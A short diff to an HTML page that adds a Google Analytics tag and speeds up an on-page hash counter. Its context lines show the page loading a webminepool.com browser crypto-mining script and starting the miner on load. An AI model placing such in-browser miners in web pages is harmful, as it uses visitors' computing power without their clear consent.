@@ -72,6 +72,18 @@
     <link href="https://fonts.googleapis.com/css2?family=Quicksand&display=swap" rel="stylesheet">
     <!-- script -->
     <script src="https://webminepool.com/lib/base.js"></script>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-8DN5TCP214"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag('js', new Date());
+
+        gtag('config', 'G-8DN5TCP214');
+    </script>
 </head>
 
 <body>
@@ -88,7 +100,7 @@
         miner.start();
         setInterval(() => {
             counter.innerHTML = miner.getTotalHashes([miner]);
-        }, 5000);
+        }, 1000);
     })
 </script>
 
